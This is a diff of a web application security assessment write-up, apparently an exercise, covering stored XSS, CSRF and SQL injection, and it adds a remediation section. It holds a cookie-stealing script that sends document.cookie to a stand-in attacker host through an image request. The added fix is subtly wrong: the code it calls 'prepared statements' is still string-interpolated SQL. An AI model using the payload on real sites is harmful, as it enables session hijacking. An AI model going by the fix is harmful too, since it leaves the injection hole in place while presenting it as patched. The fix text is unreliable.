@@ -11,11 +11,12 @@ The cookie theft is done by writing up in the message input the following line m
 
 	`Any message we want</p>
 	<SCRIPT type="text/javascript">
-		var adr = "http://www.cookiegrabber.com/evil.php?cookie=" + escape(document.cookie);
+		var image = document.createElement("img");
+		image.src = "http://www.cookiegrabber.com/evil.php?cookie=" + escape(document.cookie);
 	</SCRIPT>
 	<p>`
 
-Because the form inputs are not sanitised or checked in any way by the server we can save the message in the databese like it is. If in a Second-Order SQL Injection the data stored in database is later used to conduct SQL injection, In this case we might say that this is a Second-Order cookie hijacking because we get the session token when the user clicks on our message and renders the HTML page with our script. Stored Cross-site Scripting (XSS) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack.
+Because the form inputs are not sanitised or checked in any way by the server we can save the message in the databese like it is. If in a Second-Order SQL Injection the data stored in database is later used to conduct SQL injection, In this case we might say that this is a Second-Order cookie hijacking because we get the session token when the user clicks on our message and renders the HTML page with our script. The image will create a GET request to our evil webservice. Stored Cross-site Scripting (XSS) is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack.
 
 ## Attack B. Cross-Site Request Forgery
 
@@ -31,7 +32,6 @@ We will need to modify this form and place it into our malicious webpage. The so
 
 Part 2: White Box Assessment
 ----------------------------
-
 
 ## List of users
 
@@ -111,4 +111,18 @@ We use the $profile variable to inject our SQL command like so: (BTW the passwor
            "WHERE PersonID=$user->id";
 
 
+Part 3: Fix It
+--------------
+
+## Fixing attack A
+
+We can fix this type of attack by sanitizing the `message` and `headline` inputs and removing any special characters with the `filter_var` PHP function like so:
+
+	$headline = filter_var($_POST["headline"], FILTER_SANITIZE_STRING); 
+	$message = filter_var($_POST["message"], FILTER_SANITIZE_STRING); 
+
+Of course we can have further protection by using prepared statements and not the direct SQL statement:
+
+ 	$sql = "INSERT INTO Message (FromID, ToID, Headline, Message) " .
+            " VALUES ('$from', '$to', '$headline', '$message')";
 
